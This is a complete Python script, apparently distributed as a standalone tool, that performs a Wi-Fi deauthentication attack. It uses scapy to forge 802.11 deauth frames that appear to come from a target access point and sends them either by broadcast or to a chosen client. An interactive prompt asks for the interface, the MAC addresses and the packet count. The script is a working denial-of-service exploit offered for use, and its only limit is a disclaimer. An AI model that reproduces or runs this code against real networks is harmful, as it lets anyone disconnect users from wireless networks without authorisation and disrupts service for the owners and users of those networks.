"""
Wi-Fi Deauthentication Attack Tool
Developer: Ronald Baker
Company: Mavericks Umbrella LLC

Disclaimer:
This software is provided by Mavericks Umbrella LLC "as-is" and without any warranties or conditions,
express or implied, including but not limited to the implied warranties of merchantability and fitness for a particular purpose.
In no event shall Mavericks Umbrella LLC or its contributors be liable for any direct, indirect, incidental,
special, exemplary, or consequential damages (including but not limited to procurement of substitute goods or services;
loss of use, data, or profits; or business interruption) however caused and on any theory of liability,
whether in contract, strict liability, or tort (including negligence or otherwise) arising in any way out of
the use of this software, even if advised of the possibility of such damage.

This script performs a Wi-Fi deauthentication attack for testing and educational purposes.

Instructions:
1. Run the script with `sudo` (superuser privileges are required for sending raw packets).
2. Specify the target access point (AP) MAC address and optional client MAC address.
3. Use this tool responsibly and with permission.

Required Libraries:
- scapy (Install with `pip install scapy`)

Usage:
sudo python3 wifi_deauth_attack_tool.py
"""

from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp

def perform_deauth(interface, ap_mac, client_mac=None, count=10):
    """
    Sends deauthentication packets to the specified target(s).

    :param interface: The wireless interface in monitor mode.
    :param ap_mac: The MAC address of the target access point (AP).
    :param client_mac: The MAC address of the target client (optional).
    :param count: Number of deauthentication packets to send (default is 10).
    """
    print(f"Starting deauthentication attack on AP {ap_mac}.")
    if client_mac:
        print(f"Targeting client {client_mac}.")

    # Create deauth packet
    deauth_pkt = RadioTap() / Dot11(addr1=client_mac if client_mac else "ff:ff:ff:ff:ff:ff",
                                    addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()

    try:
        for _ in range(count):
            sendp(deauth_pkt, iface=interface, verbose=False)
        print(f"Sent {count} deauthentication packets.")
    except Exception as e:
        print(f"Error sending deauthentication packets: {e}")

if __name__ == "__main__":
    print("Welcome to the Wi-Fi Deauthentication Attack Tool.")
    print("Developer: Ronald Baker")
    print("Company: Mavericks Umbrella LLC\n")
    print("Note: Use this tool responsibly and with permission.\n")

    # Input parameters
    interface = input("Enter the wireless interface in monitor mode (e.g., 'wlan0mon'): ").strip()
    ap_mac = input("Enter the MAC address of the target access point (AP) (e.g., '00:11:22:33:44:55'): ").strip()
    client_mac = input("Enter the MAC address of the target client (optional, press Enter to skip): ").strip() or None
    count = int(input("Enter the number of deauthentication packets to send (e.g., 10): ").strip())

    try:
        perform_deauth(interface, ap_mac, client_mac, count)
    except KeyboardInterrupt:
        print("\nStopping deauthentication attack.")
    except Exception as e:
        print(f"An error occurred: {e}")

